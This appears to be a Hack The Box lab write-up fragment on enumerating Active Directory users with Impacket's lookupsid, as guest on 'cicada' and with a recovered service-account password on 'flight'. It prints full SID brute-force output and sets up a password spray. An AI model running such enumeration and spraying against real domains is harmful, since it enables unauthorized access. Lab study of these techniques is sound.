
example: cicada HTB

Impacket's lookupsid module. This tool will try brute forcing Windows Security Identifiers (SIDs) of any users in the AD domain. Each user has a unique SID, which is comprised of their relative identifier (RID) concatenated with the domain SID. User SIDs are typically issued by a Domain Controller and are used in authorization and access mechanisms such as to form a part of the access token created during sign-in. 

To enumerate the domain, we will specify the guest user, the domain name, and -no-pass for no password. 

```
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```
In the results, we find groups, users, and aliases within the domain, which helps us to understand its overall structure. Since we want a list of the users, we will compile all the items that fall under the SidTypeUser category. 

To avoid doing this manually, we will rerun the command with some additional arguments: we use grep to specify taking only the users and sed to remove any text other than the name. Then, we will pass the items into a file called users.txt . 

Now, we can conduct a password spray to test if any users still have the default password we found.

-----

```
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'

```

```
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
Impacket v0.13.0.dev0+20251002.85540.fc92f471 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at flight.htb
[*] StringBinding ncacn_np:flight.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: flight\Administrator (SidTypeUser)
501: flight\Guest (SidTypeUser)
502: flight\krbtgt (SidTypeUser)
512: flight\Domain Admins (SidTypeGroup)
513: flight\Domain Users (SidTypeGroup)
514: flight\Domain Guests (SidTypeGroup)
515: flight\Domain Computers (SidTypeGroup)
516: flight\Domain Controllers (SidTypeGroup)
517: flight\Cert Publishers (SidTypeAlias)
518: flight\Schema Admins (SidTypeGroup)
519: flight\Enterprise Admins (SidTypeGroup)
520: flight\Group Policy Creator Owners (SidTypeGroup)
521: flight\Read-only Domain Controllers (SidTypeGroup)
522: flight\Cloneable Domain Controllers (SidTypeGroup)
525: flight\Protected Users (SidTypeGroup)
526: flight\Key Admins (SidTypeGroup)
527: flight\Enterprise Key Admins (SidTypeGroup)
553: flight\RAS and IAS Servers (SidTypeAlias)
571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
572: flight\Denied RODC Password Replication Group (SidTypeAlias)
1000: flight\Access-Denied Assistance Users (SidTypeAlias)
1001: flight\G0$ (SidTypeUser)
1102: flight\DnsAdmins (SidTypeAlias)
1103: flight\DnsUpdateProxy (SidTypeGroup)
1602: flight\S.Moon (SidTypeUser)
1603: flight\R.Cold (SidTypeUser)
1604: flight\G.Lors (SidTypeUser)
1605: flight\L.Kein (SidTypeUser)
1606: flight\M.Gold (SidTypeUser)
1607: flight\C.Bum (SidTypeUser)
1608: flight\W.Walker (SidTypeUser)
1609: flight\I.Francis (SidTypeUser)
1610: flight\D.Truff (SidTypeUser)
1611: flight\V.Stevens (SidTypeUser)
1612: flight\svc_apache (SidTypeUser)
1613: flight\O.Possum (SidTypeUser)
1614: flight\WebDevs (SidTypeGroup)

```